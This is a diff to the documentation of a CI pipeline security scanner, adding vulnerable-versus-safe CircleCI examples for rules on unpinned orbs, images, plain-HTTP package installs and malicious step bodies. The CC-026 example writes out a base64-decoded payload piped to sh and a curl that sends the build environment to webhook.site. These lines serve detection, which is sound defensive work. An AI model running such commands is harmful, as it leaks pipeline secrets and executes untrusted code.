@@ -1464,6 +1464,27 @@ steps:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``circleci/aws-cli@volatile`` (or any non-
+# semver ref) resolves at config-process time to whatever
+# the orb publisher last pushed. A compromised publisher
+# ships malicious orb steps into every consumer's pipeline.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@volatile
+  python: circleci/python@dev:alpha
+
+# Safe: pin to an exact semver (``X.Y.Z``). Renovate's
+# circleci ecosystem updater bumps the pin in reviewable
+# PRs; ``@volatile`` and ``@dev:*`` never reach prod.
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@4.1.3
+  python: circleci/python@2.1.1
+```
+
 **Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }
@@ -1473,6 +1494,31 @@ steps:
 **How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.
 
 **Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``cimg/python:3.12`` is a mutable tag.
+# CircleCI's image team rebuilds it on every Python
+# point release; a publisher compromise ships code into
+# every pipeline that uses the tag.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python:3.12
+    steps:
+      - run: pytest
+
+# Safe: pin to the content-addressable digest.
+version: 2.1
+jobs:
+  test:
+    docker:
+      - image: cimg/python@sha256:abc123...  # cimg/python:3.12.1
+    steps:
+      - run: pytest
+```
 
 **Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).
 
@@ -1515,6 +1561,38 @@ steps:
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so a network attacker between the
+# runner and the registry can substitute the wheel.
+# ``--trusted-host`` silences the very error that would
+# have caught the swap.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url http://internal-pypi.example.com/simple \
+                      --trusted-host internal-pypi.example.com \
+                      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image trust store.
+version: 2.1
+jobs:
+  install:
+    docker:
+      - image: cimg/python@sha256:abc123...
+    steps:
+      - run: |
+          pip install --index-url https://internal-pypi.example.com/simple \
+                      --require-hashes -r requirements.txt
+```
 
 **Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).
 
@@ -1579,6 +1657,39 @@ steps:
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body contains ``curl /tmp/.miner |
+# bash`` or pipes a base64-decoded payload to ``sh``. A
+# malicious PR (or a compromised co-maintainer) plants
+# the crypto-miner / credential-stealer in the config
+# itself; every subsequent build executes the payload.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh   # obfuscated payload
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the build does only what the build does. No
+# obfuscated execution, no exfil POSTs, no ``base64
+# -d | sh`` pipelines. If a check fires here it's
+# either a compromise or a CTF fixture; treat as
+# incident-response until verified otherwise.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - checkout
+      - run: make build
+```
+
 **Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }
@@ -1598,6 +1709,35 @@ steps:
 **How this is detected.** CC-003 covers Docker images declared under ``docker:`` blocks. It does not reach the machine executor, where the image is on ``machine.image``. A rolling tag (``current``, ``edge``, ``default``) pulls a fresh image whenever CircleCI publishes one, reintroducing the same supply-chain risk Docker-image pinning is designed to eliminate.
 
 **Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: default`` resolves to whatever
+# CircleCI ships as the current default machine image.
+# Image updates rebuild the underlying OS / toolchain
+# silently; a compromise of the image build pipeline
+# ships malicious bytes into every machine-executor
+# pipeline that uses the default.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: default
+    steps:
+      - run: docker compose run tests
+
+# Safe: pin to a specific image release. CircleCI's
+# release notes document each tag; pin to the SHA-
+# stamped tag rather than the rolling alias.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: ubuntu-2204:2024.01.1
+    steps:
+      - run: docker compose run tests
+```
 
 **Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).
 
